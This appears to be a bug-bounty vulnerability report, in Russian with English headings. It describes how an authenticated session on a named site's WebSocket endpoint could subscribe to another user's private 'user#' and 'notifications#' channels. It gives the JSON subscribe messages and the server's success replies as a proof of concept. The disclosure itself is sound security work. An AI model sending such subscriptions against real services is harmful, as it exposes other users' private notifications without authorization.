Найденная проблема

Unauthorized subscription to private WebSocket channels

Авторизованная сессия пользователя 2584374 получила возможность успешно подписаться на персональные каналы другого пользователя 2584431.

Authenticated sessionuser#2584374 Target channelsuser#2584431 · notifications#2584431 WebSocket endpointwss://ws.vodka2e9r.com/connection/websocket

Full PoC

reproduction

После успешной авторизации в WebSocket-соединении была отправлена подписка на персональный канал другого пользователя:

{
  "id": 2,
  "subscribe": {
    "channel": "user#2584431"
  }
}

Сервер ответил успешной подпиской:

{
  "id": 2,
  "subscribe": {}
}

Далее была проверена персональная лента уведомлений:

{
  "id": 3,
  "subscribe": {
    "channel": "notifications#2584431"
  }
}

Ответ также был успешным:

{
  "id": 3,
  "subscribe": {}
}

Что было проверено

Подключение выполнялось к:

wss://ws.vodka2e9r.com/connection/websocket

На стороне frontend персональные каналы формируются на основе ID текущего пользователя, а публикации через канал уведомлений обрабатываются как пользовательские realtime-события.

Это указывает на необходимость серверной проверки ACL/authorization для каналов, содержащих идентификатор пользователя.

Проверяемые ACL

user#<user_id>
notifications#<user_id>

Ожидаемое поведение: сервер должен разрешать подписку только на каналы текущей авторизованной сессии либо на каналы, явно доступные этой роли.

Безопасность теста

Тест проводился неразрушающим способом: сообщения в чужие каналы не отправлялись, данные чужого аккаунта не изменялись, финансовые операции не выполнялись.
